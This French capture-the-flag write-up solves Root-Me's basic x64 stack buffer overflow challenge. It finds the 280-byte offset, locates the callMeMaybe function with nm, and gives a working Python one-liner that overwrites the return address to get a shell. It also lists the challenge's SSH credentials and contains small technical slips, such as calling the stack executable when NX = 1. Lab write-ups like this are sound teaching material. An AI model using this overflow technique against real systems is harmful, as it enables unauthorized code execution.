# ELF x64 - Stack buffer overflow - basic

| Auteur/Autrice | Difficulté | Points |
|----------------|------------|--------|
|     [Arod](https://www.root-me.org/Arod?lang=fr)       | Facile |   20    |     

## Sommaire
- [Partie 1 : Analyse de l'exécution](https://github.com/0xS3GFAULT/CTF-WriteUps_Fr/blob/main/rootme/App%20-%20Syst%C3%A8me/Facile/ELF%20x64%20-%20Stack%20buffer%20overflow%20-%20basic/readme.md#partie-1--analyse-de-lex%C3%A9cution)
- [Partie 2 : Analyse statique du code]()
- [Partie 3 : Exploitation du buffer overflow]()

## Session SSH

```ssh -p 2223 app-systeme-ch35@challenge03.root-me.org```

Password : ```app-systeme-ch35```

## Partie 1 : Analyse de l'exécution

Comme d'habitude, petit **checksec** du fichier **./ch35** avant de l'exécuter : 

![Screenshot](./assets/images/checksec_ch35.png?raw=true)

Pas de **canary** ni de **PIE** et la pile est exécutable (**NX** = 1) mais l'**ASLR** est activé. Heureusement pour nous, il n'aura aucun effet sur le programme puisque **PIE** = 0. L'exécutable est codé sur 64 bits, donc les adresses sont codées sur 8 octets.

Exécutons le programme : 

![Screenshot](./assets/images/exec_ch35.png?raw=true)

Le programme attend que nous saisissions quelque chose. Nous tapons alors *azerty* et il nous affiche *"Hello azerty"* avant de se fermer. Bon bah c'est tout...

Nous n'avons pas spécialement beaucoup d'informations, mais le code source en langage C du programme compilé nous est donné ! Analysons-le.

## Partie 2 : Analyse statique du code

![Screenshot](./assets/images/code_ch35.png?raw=true)

3 éléments sont déclarés dans la fonction **main** aux lignes 18 et 19 mais rien n'est initialisé :

```
char buffer[256];
int len,i;
```

Voici la représentation simplifiée de la pile : 

<pre>
----------
| buffer | (256 octets)
----------
|  len   | (8 octets)
----------
|   i    | (8 octets)
----------
|  rbp   | (8 octets)
----------
|  ret   | (8 octets)
----------
</pre>

Le **ret** dans la pile représente en fait l'adresse de la prochaine instruction à exécuter une fois l'appel du **main** terminé. 

Nous voyons assez facilement que la fonction **scanf** à la ligne 21 permet d'écrire bien plus que les 256 octets prévus pour le buffer.
De ce fait, il serait possible de réecrire l'endroit où se situe l'adresse lors de l'exécution du **ret**. Si nous regardons la pile d'un peu plus près, nous comprenons que ```256 + 8 + 8 + 8 = 280 octets ``` sont nécessaires avant d'arriver à l'endroit qui nous intéresse.

Bon tout ça c'est bien beau, mais on écrit quoi dans cet endroit ? Quelle adresse ? L'adresse de la fonction **callMeMaybe** qui permet de faire apparaître un shell **/bin/bash** !

Pour connaître son adresse, plusieurs méthodes sont possibles. Puisque l'exécutable est *not stripped*, les symboles sont toujours présents. Nous pourrions en extraire une adresse grâce à la commande ```nm```:

![Screenshot](./assets/images/nm_ch35.png?raw=true)

L'adresse à écrire est donc ```0x00000000004005e7```

Nous avons tous les éléments pour exploiter notre buffer overflow.

## Partie 3 : Exploitation du buffer overflow

A l'aide du langage de programmation Python, nous pouvons écrire le payload suivant : ```(python -c "print('A'*280+'\xe7\x05\x40\x00\x00\x00\x00\x00')";cat -) | ./ch35```

Il ne faut pas oublier le ```cat -``` qui permet de bloquer l'entrée standard **stdin** car le shell **/bin/bash** se refermera aussitôt.

Il n'y a plus qu'à se servir :

![Screenshot](./assets/images/exploit_ch35.png?raw=true)

:)
